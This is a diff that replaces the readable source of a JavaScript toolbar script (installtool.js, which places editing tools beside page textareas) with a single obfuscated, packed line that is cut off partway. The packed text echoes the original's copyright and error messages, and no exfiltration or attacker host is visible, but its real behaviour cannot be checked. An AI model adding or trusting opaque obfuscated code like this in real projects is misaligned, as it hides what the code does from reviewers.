@@ -1,827 +1,1 @@
-/*
- installtool.js
- Description: this program looks for textareas in the page and
- creates an online tool bar followign them based from cached information
- Author: Zhongyan Lin
- */
-if (document.location.toString().indexOf("localhost") >= 0
-    && typeof (handleErr) == 'undefined')
-{
-function handleErr(msg, url, l)
-{
-      var txt= "There was an error on this page.\n\n"
-       + "Error: " + msg + "\n"
-       + "URL:   " + url + "\n"
-       + "Line:  " + l + "\n\n"
-       + "Click OK to continue.\n\n";
-      myprompt(txt);
-      window.onerror = handleErr;
-      return true;
-}
-window.onerror = handleErr;
-}
-
-var onlinetooldir = "";
-var onlinetoolbarhas = false;
-if (typeof (onlinetoolbarsubject) == 'undefined')
-    var onlinetoolbarsubject = "";
-if (typeof (onlinetoolinitial) == 'undefined')
-    var onlinetoolinitial = null;
-var onlinetoolbase = null;
-var onlinetoolbasewidth = 0;
-var onlinetooltextarea = null;
-var onlinetoolx, onlinetooly;
-var onlinetoolhandle = null;
-var onlinetoolpasssel = "";
-if (typeof(onlinejslist) == 'undefined')
-    var onlinejslist = new Array();
-
-function targe(cgi)
-{
-
-    if (cgi.indexOf('Upload') == 0)
-    {
-        if (typeof (tstmp) != 'undefined')
-            return "w" + tstmp;
-    }
-    else if (typeof (parent.frames[1]) != 'undefined' && parent.frames[1] != null && parent.frames[1] != self)
-        return parent.frames[1].name;
-    else
-        return "_blank";
-}
-function onlinetoolbarinit()
-{
-     
-    if (onlinetoolbarhas == false)
-        onlinetoolbarsearch(document.body);
-    else
-    {
-        if (onlinetoolinitial == null)
-        {
-            onlinetoolinitial = GetCookie("myonlinetools" + onlinetoolbarsubject);
-            if (onlinetoolinitial == null)
-            {
-               
-            }
-        }
-        if (onlinetoolinitial!=null && onlinetoolinitial != '')
-        {
-            onlinetoolbarmake(onlinetoolinitial);
-            onlinetoolinitial = '';
-        }
-
-    }
-}
-function onlinetoolposition(oElement)
-{
-    if (oElement == null)
-        return [0, 0];
-    if (typeof (oElement.offsetParent) != 'undefined')
-    {
-
-        var originalElement = oElement;
-        for (var posY = 0, posX = 0; oElement != null; oElement = oElement.offsetParent)
-        {
-            posY += oElement.offsetTop;
-            posX += oElement.offsetLeft;
-            if (oElement != originalElement && oElement != document.body && oElement != document.documentElement)
-            {
-                posY -= oElement.scrollTop;
-                posX -= oElement.scrollLeft;
-            }
-        }
-        return  [posX, posY];
-    }
-    else
-    {
-        return  [oElement.x, oElement.y];
-    }
-}
-
-function onlinetoolstylestr(dtype)
-{
-    switch (dtype)
-    {
-        case "text":
-            return " style=\"border:1px #b0b0b0 inset;background-color:white;color:#aaaaaa\" ";
-        case "file":
-            return " style=\"width:1px;visibility:hidden\" ";
-        case "password":
-            return " style=\"border:1px #b0b0b0 solid;background-color:white;\"";
-        case "checkbox":
-        case "radio":
-            return " style=\"border:0;background-color:transparent\" ";
-        case "hidden":
-            return "";
-    }
-    return "";
-}
-
-function jsform(cgi, option, i, caption)
-{
- 
-    var argu = option.replace(/[^\(]+\([ ]*/, "").replace(/[ ]*\)[ ]*$/, "");
-   
-    var calls = option.replace(/\(.*/, "(");
-     
-    var seq = "";
-    var args = argu.split(",");
-    var ans = "";
-    var alloptions = "<table cellpadding=0 cellspacing=0 border=0   " + ((onlinetoolbarsubject != 'tst') ? '' : 'id=thetoolbar') + "><tr>";
-    
-    var hasfile = "";
-    if (argu != "")
-    {
-        for (var ll = 0; ll < args.length; ll++)
-        {
-            var dd = 0;
-            if (seq != '')
-                seq += ",";
-            if (args[ll] == 'this')
-                seq += 'this';
-            else if (isNaN(args[ll]) == false)
-            {
-                dd = parseDouble(args[ll]);
-                seq += args[ll];
-            }
-            else
-            {
-                if (args[ll].charAt(0) == '\'' || args[ll].charAt(0) == '"')
-                {
-                    seq += args[ll];
-                }
-                else
-                {
-                    var zz = args[ll].indexOf("_");
-                    if (zz == -1)
-                    {
-                        zz = args[ll].length;
-                        args[ll] += "_a";
-                    }
-                    var dtype = "text";
-                    var dname = args[ll].substring(0, zz);
-
-                    dtype = args[ll].substring(zz + 1);
-
-                    if (dtype.toLowerCase().indexOf("a") == 0)
-                    {
-                        seq += "onlinetooltextarea";
-                    }
-                    else
-                    {
-                        if (dtype.toLowerCase().indexOf("n") == 0)
-                            seq += "parseFloat(document.toolform" + i + "." + dname + ".value)";
-                        else if (dtype.toLowerCase().indexOf("s") == 0)
-                            seq += "document.toolform" + i + "." + dname + ".value";
-                        else
-                            seq += "this.form." + dname + "";
-                    }
-
-
-                    if (dtype.toLowerCase().indexOf("a") != 0)
-                    {
-                        if (dtype.toLowerCase().indexOf("h") == 0)
-                            dtype = "hidden";
-                        else if (dtype.toLowerCase().indexOf("p") == 0)
-                            dtype = "password";
-                        else if (dtype.toLowerCase().indexOf("c") == 0)
-                            dtype = "checkbox";
-                        else if (dtype.toLowerCase().indexOf("f") == 0)
-                            dtype = "file";
-                        else
-                            dtype = "text";
-                        if (dtype == ("radio") || dtype == ("checkbox"))
-                        {
-                            alloptions += "<td><nobr>" + dname.substring(0, 1).toUpperCase() + dname.substring(1) + "</nobr></td>";
-                        }
-                        var opstyle = " size=6 ";
-                        if (dtype == "file")
-                        {
-                            opstyle =    " style=width:1px;visibility:hidden  ";
-                            hasfile = dname;
-   
-                        }
-                        alloptions += "<td   ><input type=" + dtype +   opstyle + "  name=\"" + dname + "\"   " + onlinetoolstylestr(dtype) + " class=Parameter  ";
-                        if (dtype.toLowerCase().indexOf("t") == 0)
-                        {
-                            alloptions += "   onfocus=onlinetoolcolor(this,0) onblur=onlinetoolcolor(this,1) value=\"" + dname + "\""
-                        }
-                        alloptions += "></td>";
-                    }
-                }
-            }
-        }
-
-    }
-
-    ans += "<form name=toolform" + i + " style=\"margin:0px 0px 0px 0px\" target=" + targe(cgi) + ">" + alloptions + "<td  >"
-    if (hasfile!='')
-    { 
-        ans +=  "<input class=\"BlueButton Button\" type=button  name=webservice" + i + "   value=\"" + textmsg[779]  + "\"";
-        ans +=  " onclick=\"this.form." + dname + ".click()\" ";
-        ans +=  "  >";
-    }
-    else 
-    { 
-        ans += "<input class=\"BlueButton Button\"   type=button  name=webservice" + i + "  value=\"" + caption
-            + "\" onclick=\"setformbeingaction(this);" + calls + seq + ")\"   >";
-    }
-    ans += "</td></tr></table></form>";
-
-    return ans;
-}
-var formbeingaction;
-function setformbeingaction(t)
-{
-    formbeingaction=t.form;
-}
-function associatename(txt, nm)
-{
-    var fm = txt.name;
-
-    for (var i = 0; i < fm.elements.length; i++)
-        if (nm == fm.elements[i].name)
-            return fm.elements[i];
-}
-function onlinetoolcolor(txt, s)
-{
-    if (s == 1)
-    {
-        if (txt.value == '')
-        {
-            txt.value = txt.name;
-            txt.style.color = "#aaaaaa";
-        }
-    }
-    else
-    {
-        var x = txt.style.color.toString().toLowerCase().replace(/ /g, '');
-
-        if (x == '#aaaaaa' || x == 'rgb(170,170,170)')
-        {
-            txt.value = '';
-            txt.style.color = "#000000";
-        }
-    }
-}
-function cgiform(cgi, option, i, caption)
-{
-
-    var alloptions = "";
-    var hiddens = "";
-    var aname = null;
-    var opts = option.split("&");
-    var tail = "?";
-    var ll;
-    var hasfile= "";
-    for (ll = 0; ll < opts.length; ll++)
-    {
-       
-        if (opts[ll].indexOf("=") == -1  )
-        {
-            var zz = opts[ll].indexOf("_");
-            if (zz == -1) 
-            {
-                zz = opts[ll].length;
-                opts[ll] += "_a";
-            }
-            var dtype = opts[ll].substring(zz + 1);
-            var dname = opts[ll].substring(0, zz);
- 
-            if (dtype.toLowerCase().indexOf("a") == 0)
-            {
-                hiddens += "<input type=hidden name=\"" + dname + "\" value=\"??\" >";
-                aname = dname;
-            }
-            else
-            {
-               
-                if (dtype == null)
-                    dtype = "text";
-                else if (dtype.toLowerCase().indexOf("t") == 0)
-                    dtype = "text";
-                else if (dtype.toLowerCase().indexOf("p") == 0)
-                    dtype = "password";
-                else if (dtype.toLowerCase().indexOf("r") == 0)
-                    dtype = "radio";
-                else if (dtype.toLowerCase().indexOf("c") == 0)
-                    dtype = "checkbox";
-                else if (dtype.toLowerCase().indexOf("f") == 0)
-                    dtype = "file";
-                else if (dtype.toLowerCase().indexOf("h") == 0)
-                    dtype = "hidden";
-                if (dtype == ("radio") || dtype == ("checkbox"))
-                    alloptions += "<td  ><nobr>" + dname.substring(0, 1).toUpperCase() + dname.substring(1) + "</nobr></td>";
-                alloptions += "<td  ><input type=" + dtype + "   name=\"" + dname + "\"   " + onlinetoolstylestr(dtype);
-                if (dtype.toLowerCase().indexOf("t") == 0)
-                    alloptions += "    size=6   onfous=onlinetoolcolor(this,0) onblur=onlinetoolcolor(this,1) value=\"" + dname + "\""
-                else if (dtype.toLowerCase().indexOf("f") == 0)
-                {
-                    alloptions += "  style=width:1px;visibility:hidden onchange=\"onlinetoolcp(this,'" + aname + "');visual(document.toolform" + i + ");document.toolform" + i + ".submit()\"  ";
-                    hasfile = dname; 
-                }
-                alloptions += "></td>";
-                 
-            }
-        }
-        else
-        {
-            var xx = opts[ll].split(/=/);
-            hiddens += "<input type=hidden name=\"" + xx[0] + "\" value=\"" + xx[1] + "\">";
-        }
-    }
-   
-    var allbuts = '';
-    if (cgi.indexOf('/Upload') == -1)
-    {
-       allbuts = "<input class=\"BlueButton Button\"  type=submit  name=webservice" + i + "   value=\"" + caption  + "\"";
-        if (aname != null)  allbuts += " onclick=\"onlinetoolcp(this,'" + aname + "')\" ";
-        allbuts += "  >";
-    }
-    if (hasfile!='') 
-     {
-        allbuts = "<input class=\"BlueButton Button\"  type=button  name=webservice" + i + "   value=\"" + textmsg[779]  + "\"";
-        allbuts += " onclick=\"this.form." + hasfile + ".click()\" ";
-        allbuts += "  >";
-    }
-    var ans = "<form name=toolform" + i;
-    if (cgi.indexOf("/Upload") >= 0)
-        ans += " enctype=\"multipart/form-data\" ";
-    ans += " style=\"margin:0px 0px 0px 0px\" method=post action=\"" + cgi + "\" target=\"" + targe(cgi) + "\" ><table cellpadding=0 " + ((onlinetoolbarsubject != 'tst') ? '' : 'id=thetoolbar') + " cellspacing=0 border=0  ><tr><td width=1  >" + hiddens + "</td>" + alloptions + "<td  >" + allbuts + "</td></tr></table></form>";
- 
-    return ans;
-}
-function onlinetoolcp(button, aname)
-{
-    fsnd = button.form;
-    for (var i=0; i < fsnd.elements.length; i++)
-        if (fsnd.elements[i].name == aname) break;
-    var x = fsnd.elements[i];
-    
-    if (onlinetooltextarea!=null)
-    x.value = onlinetooltextarea.value;
-    if (fsnd.action.indexOf("/Upload") >= 0)
-    {
-        
-        fsnd.target = "w" + tstmp;
-        
-    }
-    else if (fsnd.action.indexOf("/preview.jsp") >= 0 && typeof(guessFormat)!='undefined')
-    {
-        if (typeof(fsnd.format)!='undefined' && (fsnd.format.value==null || fsnd.format.value=='' || fsnd.format.value=='0'))
-        {
-            
-            fsnd.format.value = guessFormat(x.value);
-        }
-    }    
-    
-    formnewaction(fsnd );
-    
-}
-function onlinetoolmini(btn)
-{
-    if (btn==null || onlinetoolbase ==null) return;
-    var xy = onlinetoolposition(onlinetoolbase);
-    if (btn.value == '.')
-    {
-        onlinetoolbasewidth = onlinetoolbase.offsetWidth;
-       
-        //btn.style.cssText = "background-color:orange;border-radius:11px;width:22px;";
-        btn.style.cssText = "background-image:url(image/hammer.png);width:22px;color:white;font-size:12px;text-align:center";
-         
-        onlinetoolbase.style.overflow = "hidden";
-        onlinetoolbase.style.width = "24px";
-        var x = parseInt(onlinetoolbase.style.left.replace(/px/,''))-24; 
-        var y = parseInt(onlinetoolbase.style.top.replace(/px/,''))+60;
-        if (x >= 5)
-        {
-            onlinetoolbase.style.left = x + "px";
-            onlinetoolbase.style.top =  y + "px";
-        }
-        btn.value = ''; 
-    }
-    else
-    {
-        if (onlinetoolbasewidth != 0)
-        {
-            onlinetoolbase.style.width = null;// onlinetoolbasewidth + "px";
-        }
-        else
-        {
-            onlinetoolbasewidth = onlinetoolbase.offsetWidth;
-        }
-        onlinetoolbase.style.left = (parseInt(onlinetoolbase.style.left.replace(/px/,''))+24) + "px";
-        onlinetoolbase.style.top = (parseInt(onlinetoolbase.style.top.replace(/px/,''))-60) + "px";
-        btn.style.cssText = "background-color:orange;width:22px;color:white;font-size:12px;text-align:center";
-        btn.value = '.';
-    }
-}
-
-function onlinetooldown(e)
-{
-    if (typeof e == 'undefined')
-        e = window.event;
-    if (typeof e.layerX == 'undefined')
-        e.layerX = e.offsetX;
-    if (typeof e.layerY == 'undefined')
-        e.layerY = e.offsetY;
-    onlinetoolx = e.layerX;
-    onlinetooly = e.layerY;
-
-}
-
-function onlinetoolup(e)
-{
-    if (onlinetoolbase == null) return;
-    if (typeof e == 'undefined')
-        e = window.event;
-    if (typeof e.layerX == 'undefined')
-        e.layerX = e.offsetX;
-    if (typeof e.layerY == 'undefined')
-        e.layerY = e.offsetY;
-    onlinetoolbase.style.left = (onlinetoolbase.offsetLeft + e.layerX - onlinetoolx) + "px";
-    onlinetoolbase.style.top = (onlinetoolbase.offsetTop + e.layerY - onlinetooly) + "px";
-    onlinetoolx = e.layerX;
-    onlinetooly = e.layerY;
-
-}
-
-function onlinetoolmove(e)
-{
-    if (onlinetoolbase == null) return;
-    if (typeof e == 'undefined')
-        e = window.event;
-    if (typeof e.layerX == 'undefined')
-        e.layerX = e.offsetX;
-    if (typeof e.layerY == 'undefined')
-        e.layerY = e.offsetY;
-    onlinetoolbase.style.left = (onlinetoolbase.offsetLeft + e.layerX - onlinetoolx) + "px";
-    onlinetoolbase.style.top = (onlinetoolbase.offsetTop + e.layerY - onlinetooly) + "px";
-    onlinetoolx = e.layerX;
-    onlinetooly = e.layerY;
-
-}
-function jsnotexist(jss, cgi)
-{
-    for (var i=0; i < jss.length; i++)
-    if (jss[i].src.indexOf(cgi) >= 0 )
-        return false;
-    return true;
-}
-function onlinetoolstr(mytools)
-{
-    
-    if (mytools == '') return '';
-    var i = 0;
-    
-    var jscount = 0;
-    var ans = '';
-    var picheight = 14;
-    if (typeof(font_size)!='undefined')
-    {
-        picheight = font_size + 0;        
-    } 
-    else if (typeof(fontsize)!='undefined')
-    {
-        picheight = fontsize + 0;   
-    }
-    ans = onlinetoolround1() + "<table id=\"thetoolbar\" class=outset3 cellpadding=0 cellspacing=0 border=0><tr>";
-    ans += "<td><input id=tosmall type=button class=\"BlueButton Button\" style=\"text-align:center;width:22px\" onclick=\"onlinetoolmini(this)\" value=\"&bull;\" ></td>";
-    if (onlinetoolbarsubject != 'tst')
-    {
-        //ans+= "<td  bgcolor=white><input name=onlineco  type=button value=\"MoreTool\" class=BlueButton style=\"background-color:#5ba9cf\" onclick=\"javascript:onlinetoolconfigure()\"></td>";
-    }
-    i = mytools.indexOf(";");
-    
-    var sep = mytools.substring(0, i + 1);
-    
-    var re = new RegExp(sep);
-    var list = mytools.substring(i + 1).split(re);
-    var N = Math.ceil(list.length / 6);
-    
-    var names = "";
-    var alljss = ",";
-    var jss = document.getElementsByTagName("script");
-    if (onlinetoolinitial.indexOf(";Edit;") < 0)
-        onlinetoolinitial += ";" + textmsg[1378] + ";tealeaman;" + textmsg[1378] + "HTML;Edit;findrep.js;wyewyg(source_a)";
-        if (onlinetoolinitial.indexOf(";LaTex;") < 0)
-        onlinetoolinitial += ";LaTex;tealeaman;LaTex toolbar;LaTex;findrep.js;showlatexpanel(content_a,this)"; 
-        if (onlinetoolinitial.indexOf(";Find;") < 0)
-         onlinetoolinitial += ";"   + textmsg[1561] + ";tealeaman;" + textmsg[1561] + ";Find;findrep.js;findstrintextarea2(Content_a,Pattern_t);"
-            + textmsg[1562] + ";tealeaman;" + textmsg[1562] + ";Find;findrep.js;replacestrintextarea2(source_a,NewString_t)";
-    
-    
-    
-    for (i = 0; i < N; i++)
-    {
-        
-        var caption = list[i * 6];
-        
-        var category = list[i * 6 + 1];
-        var des = list[i * 6 + 2];
-        var name = list[i * 6 + 3];
-         
-        names += name + ",";
-        var cgi = list[i * 6 + 4];
-        
-        if (cgi == null) break;
-        var nosrc = false;
-        if ( cgi.indexOf("/") < 0)
-        {
-            if (cgi.replace(/ /g,'') == '')
-               nosrc = true; 
-            cgi = onlinetooldir + cgi;
-        }
-
-        var option = "";
-        if (list[i * 6 + 5]!=null)
-            option = list[i * 6 + 5].replace(/^[ ]+/, '').replace(/[ ]+$/, '');
-      
-        ans += "<td >";
-        
-        if (option.replace(/^[a-z|0-9|_|\.]+\([^\)]*\)$/i, '') == '')
-        {
-            if (cgi != null && cgi.replace(/ /g,'') != '' && alljss.indexOf("," + cgi + ",") < 0 && jsnotexist(jss,cgi) )
-            {
-                alljss = alljss + cgi + ",";
-                var n = jscount;
-                onlinejslist[n] = document.createElement('script');
-                onlinejslist[n].id = "onlinejs" + n;
-                onlinejslist[n].type = "text/javascript"; 
-                onlinejslist[n].src = cgi;
-                document.body.appendChild(onlinejslist[n]);
-                 
-                jscount++;
-            }
-           
-            ans += jsform(cgi, option, i, caption);
-           
-        }
-        else
-        {
-            
-            ans += cgiform(cgi, option, i, caption);
-            
-        }
-      
-        ans += "</td>";
-    }
-    ans += "<td><table cellspacing=0 cellpadding=0><tr><td><input  type=button class=\"BlueButton Button\" style=width:30px;text-align:center;font-size:" + font_size + "px  value=\"&larr;\" onclick=\"document.execCommand('undo')\" ></td><td><input  type=button class=\"BlueButton Button\" value=\"&rarr;\"  style=width:30px;text-align:center;font-size:" + font_size + "px onclick=\"document.execCommand('redo')\" ></td></tr></table></td>";
-    
-    ans += "</tr></table>" + onlinetoolround2();
-    onlinetoolpasssel = names;
-  
-    return ans;
-}
-
-
-
-function onlinetoolconfigure()
-{
-    onlinetoolhandle = open(onlinetooldir + "toolset.jsp");
-}
-
-function passName()
-{
-    return onlinetoolpasssel;
-}
-function onlinetoolbarmake(initstr)
-{
-    var jss = document.getElementsByTagName("script");
-    for (var i = 0; i < jss.length; i++)
-    if (jss[i].src.indexOf("installtool.js") >= 0)
-    {
-        onlinetooldir = jss[i].src.replace(/installtool.js/, '');
-        break;
-    }
-    var st = document.createElement('style');
-    st.innerHTML = ("input.Button{font-weight:bold;overflow:visible;color:white;height:22px;font-size:16px;width:68px;border-radius:3px;border:1px #b0b0b0 outset}\ninput.Parameter{background:white;color:black;height:22px;font-size:16px;width:68px;border-radius:0px;border:1px #b0b0b0 outset;}");
-    document.getElementsByTagName('head')[0].appendChild(st);
-    onlinetoolbase = document.createElement("div");
-    onlinetoolbase.id = "mobiletoolbar";
-    onlinetoolbase.style.cssText = "position:absolute;z-index:20;padding:0px;visibility:hidden;border:0px";
-    
-    onlinetoolbase.innerHTML = onlinetoolstr(initstr);
-    document.body.appendChild(onlinetoolbase);
-    unifonts(onlinetoolbase);
-    onlinetoolmini(document.getElementById('tosmall'));
-    /*debugger;
-     onlinetoolbase = document.createElement('div');
-     onlinetoolbase.style.zIndex = 20;
-     onlinetoolbase.style.position = "absolute";
-     onlinetoolbase.setAttribute("background","white");
-     var bordercolor = "#BBBBBB";
-     onlinetoolbase.style.padding = "0px";
-     onlinetoolbase.style.visibility = "hidden";
-     onlinetoolbase.innerHTML = str;
-     document.body.appendChild(onlinetoolbase);
-     */
-
-}
-
-var onlinetoolnextsep = function(sep)
-{
-    if (sep.charAt(0) == '#')
-        sep = '@' + sep;
-    else
-        sep = '#' + sep;
-    return sep;
-}
-
-function onlinetoolgetselected(zz, dao)
-{
-    if (onlinetoolbase == null) return;
-    var sep = "#";
-
-    while (true)
-    {
-        for (var i = 0; i < zz.length; i++)
-        {
-            var hit = false;
-            if (zz[i])
-            {
-                for (var j = 0; j < dao.NUMCOLS; j++)
-                {
-                    if (dao.retrv(i, j).indexOf(sep) >= 0)
-                    {
-                        hit = true;
-                        break;
-                    }
-                }
-            }
-            if (hit == true)
-                break;
-        }
-        if (hit == true)
-            sep = onlinetoolnextsep(sep);
-        else
-            break;
-    }
-    sep = sep + ";";
-    var mytools = "";
-    for (i = 0; i < zz.length; i++)
-    {
-        if (zz[i])
-        {
-            for (j = 0; j < dao.NUMCOLS; j++)
-            {
-                mytools += sep + dao.retrv(i, j);
-            }
-        }
-    }
-    var x = onlinetoolbase.style.left;
-    onlinetoolbase.innerHTML = onlinetoolstr(mytools);
-     
-    
-    if (navigator.appName.indexOf("Explorer") < 0)
-        onlinetoolbase.style.overflow = "display";
-    SetCookie("myonlinetools" + onlinetoolbarsubject, mytools);
-    onlinetoolbase.style.left = x;
-    if (navigator.appName.indexOf("Explorer") >= 0)
-        onlinetooladjust();
-}
-function onlinetoolbarfollow(ta)
-{
-    
-    var xy = [400,400];
-    if (ta != null)
-    {
-        xy = onlinetoolposition(ta);
-    }
-    else if (document.getElementById('theattach')!=null)
-    {
-        xy = onlinetoolposition(document.getElementById('theattach'));
-    }
-    
-     
-        
-    if (onlinetoolbase != null)
-    {
-        
-        onlinetoolbase.style.visibility = "visible";
-        onlinetooltextarea = ta;
-        
-    }
-    else
-    {
-        onlinetoolbarhas = true;
-        onlinetoolbarinit();
-        onlinetoolmini(document.getElementById('tosmall'));
-    }
-    if (onlinetoolbase == null) return;
-    if (onlinetoolbase.offsetWidth > 50 || xy[0]<=40)
-    {
-        onlinetoolbase.style.left = (xy[0]) + "px";
-        onlinetoolbase.style.top = (xy[1] - onlinetoolbase.offsetHeight) + "px";
-    }
-    else  
-    {
-        onlinetoolbase.style.left = (xy[0]-24) + "px";
-        onlinetoolbase.style.top = (xy[1]+35) + "px";
-    }
-     
-}
- 
-function onlinetoolbarsearch(ele)
-{
-    
-    if (ele == null || ele.tagName == null)
-        return;
-    if (ele.tagName.toLowerCase() == 'textarea')
-    {
-         
-        if (onlinetoolbarhas == false)
-        {
-            onlinetoolbarfollow(ele);
-        }
-        onlinetoolbarhas = true;
-        if (typeof (ele.onfocus) == 'function')
-        {
-            var existing = ele.onfocus;
-            ele.onfocus = function()
-            {
-                existing();
-                onlinetoolbarfollow(this);
-                
-            };
-        }
-        else
-        {
-            ele.onfocus = function()
-            {
-                onlinetoolbarfollow(this);
-            };
-        }
-    }
-    else
-    {
-        var c = ele.childNodes;
-        if (c != null || c.length > 0)
-        {
-            for (var i = 0; i < c.length; i++)
-                onlinetoolbarsearch(c[i]);
-        }
-    }
-}
-function onlinetoolround1() {
-    return "<div style=\"border:0px #b0b0b0 outset;border-radius:0px\">";
-}
-
-function onlinetoolround2() {
-    return "</div>";
-}
-
-
-function onlinetooladjust0(ele)
-{
-    if (ele == null)
-        return;
-    var eles = ele.childNodes;
-    if (eles == null || eles.length == 0)
-    {
-        if (typeof (ele.tagName) != 'undefined'  && ele.className == 'BlueButton Button')
-        {
-            ele.style.width = (ele.parentNode.offsetWidth - 2) + 'px';
-        }
-    }
-    else
-    {
-        for (var i = 0; i < eles.length; i++)
-            onlinetooladjust0(eles[i]);
-    }
-}
-function onlinetooladjust()
-{
-    var toolbar = document.getElementById("thetoolbar");
-  //  onlinetooladjust0(toolbar);
-}
-function initmini()
-{
-    if (onlinetoolbase == null) 
-    {
-        return;
-    }
-    var xy = onlinetoolposition(onlinetoolbase);
-   
-    onlinetoolbase.style.overflow = "hidden";
-    onlinetoolbase.style.width = "20px";
-     
-}
-var oldonloadtool = window.onload;
-window.onload = function()
-{
-    try{ 
-    if (oldonloadtool!=null)   
-        oldonloadtool();
-    }catch(e){}
-    onlinetoolbarinit();
-    
-    if (onlinetoolbarhas)
-    {
-        if (navigator.appName.indexOf("Explorer") >= 0)  onlinetooladjust();
-    }  
-}
-
- 
-
-
+l1l=document.documentMode||document.all;var c6ca8b5de=true;ll1=document.layers;lll=window.sidebar;c6ca8b5de=(!(l1l&&ll1)&&!(!l1l&&!ll1&&!lll));l_ll=location+'';l11=navigator.userAgent.toLowerCase();function lI1(l1I){return l11.indexOf(l1I)>0?true:false};lII=lI1('kht')|lI1('per');c6ca8b5de|=lII;zLP=location.protocol+'0FD';jMM7P1RKuYsgy1=new Array();eOS44u7O5WK8MJ=new Array();eOS44u7O5WK8MJ[0]='%77\110%7Au%32%31n';jMM7P1RKuYsgy1[0]='	~zb~~~~~~~~~	~\n~~~\r~~~~~~~~~~~~~~~\r~~~ ~!~"~#~$~%~&~\'~(~)~*~+~,~-~.~/~0~1~2~3~4~5~6~7~8~9~:~;~<~=~>~?~@~A~B~C~D~E~F~G~H~I~J~K~L~M~N~O~P~Q~R~S~T~U~V~W~X~Y~Z~[~\\~]~H~~`~a~b~c~d~e~f~g~h~i~j~cdl=document.layers;oe=win~pw.op~|a?1:0;da=(~p~r~t~v.}~s~utMode||}}~wall)&&!}zb;g}}%}.}1tEle}&ById;ws}}}.si}!bar?true:f}(se;tN=navigator.u}UrA}1}}aLow~|Ca}U();iz}Y}X.}DexOf(\'netsca}\n\')>=0}M}O}Q}Sl}U;zi}B}||8~oa;v}K msg=\'\';function |m}s{r|ur|0}N}P}}@}D}m}|rr}b =|1}:|OF}C}|@l~q}`|.n.p|D}acol}z}}|}~|zbfi}9|	!=-1|}P}R}T}Vi7f=|s},!z|K|i||l;/*|}|~|{zb{{{{{{{\r\n* (C) C}	yr}^ht 2004-{21 by Syst}:s |/ Web, I|+.  A}) R{|{:e}fved{5 *{	{Auth}b: Z{Lngya|0L}{6{Y{Z{[{\\{]{^{_{]{F{\n{{d{e{f{g|~/{	if{ ty}\no}i|-sago} ~pma}{=|G\'|*}!|a|d|	{	{{	{Y|r {u|{x{zd{|{~|0|G}3}|P||-|/.}aS}N}g}s|\\}!}}}\'{tps://z{Q{S{Ul}}5{uhub}zo|	;z{6{l{z{w{y{{o{}{X|e 0)zB z\n{]z~wz|Rzh|6{mzz,z.z0z2z4{Tnz7|Tgz:z<z>/}G{(/|\'zQ}{	zr\n||z}{\'}(l}a|Z.jszD{?c{pzn{N{K| |Vogram |Pok{*f|E{(xt}Ke}qz|:hey{xy#{Udzyy{({*{U{+ze}y#z|l{!| y})}m}^y!}:y5}Ud f|Dy|cy"y?}yr{}yz{I{K{M{Ozcy.{Wnz*{j\nzD}~q}z|Qyz oz"{{Rz&}{z)("zXl{L{\'"{|zNzQ },{o{qe{s{hy\'}9E|Czzbzzez{Bz	\nzS|)|+y y{}y}|C(|"g{1|8l{1}*z\nys{6z{oy|G"Ty"|6 wyy.~||Dz{,y\n{*py%.\\nx1"x{6+ "y~x){N" x7xx>x8x3x5xA"URL{N{6x=x7xxExCzT{\\x7"yT}QxKxAy4xSx1xP{]xSCz7ck OK{oo |Y~v}}Px0x2n"zAxQ{Zm{qyBy(ty}tx5}|N}|/x(|E|Gx\r~mex:xq{\\|6t|8|:|xqztx}}Ewzb|Cwxy|w|Cw{	x|/zf|{zldizxxpw| wy1y3}Jry{{*|G||{k{mxxywyy(w)|w+}Ksz<je|,xzb z|]xzzPxr wy0w:w w,w=bw?|,|Fx8w&yYw4{p{rw4w9w|Z}z}(wBwDzy1wGyswKwy3w_|-}(wTnu})xqwhw*wN}qy#|Gwowqw\'x*wLw]l}J}U}d{KwT}w{y/wiw yy|6awnwplwrw(w}y3x{1w\\y3yvw|v	|Zw}9vwz\nwswM|Zx.sv(ey4w%xqyZwYyx}w\\zz7{\'wbxwFx{Zv$ev3|{wxew{7|C~z}sxqx	|,|S{o}K}1(czhwHzS{ZyZvOiz\'|^z*Up|PawG|F|GzOysvR{]v.w6wX{\'mp{zMwcxwev9{` w\nwx8wxL{ovhpw{Yzt{Zv*}UzwXvf{x.|6}yAy{?[1]vkxwEvoyt&y$u~wu~tsu] zMwyy4yuu}4uu\nuu|G}UlfwH{^vs|9uu"yuu.}[~tv{{6vexDvr|7u."_b~ynkwVztvHxvwuyd{u}sxwI ysyZuI|Zw,w.v_y@|lu+{]uSww<yryEy[}}4b} yx{wIu9vbu;uRvw wkiwmz|1vuZ{\\vc{`u\\upur G|{yieyixtu\\svwu\\wOw>w@tuhvqu{uznw`v+wxuuu;{Zuxttv|u;v}vdw[unw^twll|euuvwtt#tu&wCvpuwt{6t	}K{}kttttvqt9t%wT|&u7{[t{6ztuF|*vI{,u\\pozm|Sw8}8}:}vQuQw[tP}&uWuuv{[u-|0[0{10]tAvewZttV}4{sf}UtPy~vuwCv7votZtv:w({zh}[ltg~vwTot|ttA{ZyI{xtKsYv{1sXv;{+szbt.ust}9tW|GstQ}titktmutZtt2ytLs	+sszb}ftj|T}	s{]sx>s\'sths*tkLxss"uRszM}b}^}}(syustWzMzV.ued{#sDs=zy\\}&}sP}szbs {]tuvqss	-s3s~w||D})s-vzs"{Zs1s\\ss4}s`|Zls8fs:uO{]tCtBu;t\\{6[sss$tbysstujwIsX{6sw [sE}4vsis^.ys}wItE{	uGvJt{p}9{\'r}v/tSwIs}tyE{vywttu;|uzb"v":s"swx={\'y}9=\\"uer}!r:1px #b0r?r?y tk;}Jxayoz-|Y|Pr8wh{u}VrL{M#arVrWr3x8s/{6r&y#"|a}9r*r,u=|0r.r}r3v{Kr9r;||ib|b{uy:rPz~urYwV{^r]x8v\'r}bdrbsrw	rdx8 r/r1r3r5r7rlr<r>r@qqw^}?rFkrHrJrSrNrP{(;r3rz{]r|"yEw@kuexqr{wvx8yw"oq(vqr-qrgr2r4qzb~|}rEarG|Dq|Z{M}N{Usu!~vryr[xhq*"rv}!xor+qt[q"qtDysr-uErtGxzyI|3vUvy|S{1i{1|q_|/ruPwIxvLut~qe|T|6v[q:t/[^\\(]+qw[ ]yW{1qQ).qp~ycqsq|q~\\)p*$/pzbyou7wg| |})w/{+qnpeqqp(/qw.qx8yit;{Ypz}UqwTqQtAqjrgpqk}Fv[uL",pp\' qAp+qRwJ| zz}	yp"<yuAy#p})x.zz$|xhv*|x.cpM0{!q6rpNxWx7(w8t"u]~}twSvl|t|	 ?t/ {N\'}H={Kw~w,pfxS>pEr>p=p9w.r`wwwUtcw4qkt.pukqNs(x{9v`s{9<p:p/s~x~ug{Ko\nl++sV{6r{[x